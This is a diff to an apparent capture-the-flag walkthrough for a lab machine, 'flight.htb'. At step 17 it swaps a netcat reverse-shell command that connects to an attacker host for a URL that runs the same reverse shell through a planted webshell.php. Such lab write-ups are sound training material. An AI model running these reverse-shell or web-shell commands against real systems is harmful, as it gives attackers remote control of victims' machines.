@@ -116,7 +116,7 @@
 
 17. Now, we will upgrade to a proper reverse shell by uploading netcat and using that to connect to our attacker host
 
-`nc.exe 10.10.14.226 4444 -e cmd.exe`
+`http://school.flight.htb/webshell.php?cmd=nc.exe%20-e%20cmd.exe%20%2010.10.14.226%204444`
 
 <img width="521" height="128" alt="image" src="https://github.com/user-attachments/assets/c4862cde-ab09-422c-aa92-318fe4344593" />
 
